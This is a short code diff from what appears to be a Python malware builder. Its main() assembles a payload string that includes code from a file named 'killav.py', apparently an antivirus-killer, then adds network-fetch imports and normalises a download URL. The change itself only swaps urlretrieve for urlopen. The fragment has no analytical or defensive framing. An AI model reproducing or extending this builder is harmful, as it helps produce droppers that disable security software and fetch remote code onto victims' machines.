@@ -144,9 +144,9 @@ def main():
         f += get_code( os.path.join(p,"killav.py") )+"\n"
 
     if sys.version_info[0]==3:
-    	f += '\nfrom urllib.request import urlretrieve'
+    	f += '\nfrom urllib.request import urlopen'
     elif sys.version_info[0]==2:
-    	f += '\nfrom urllib import urlretrieve'
+    	f += '\nfrom urllib import urlopen'
 
     if "http" not in url:
         url = "http://"+url
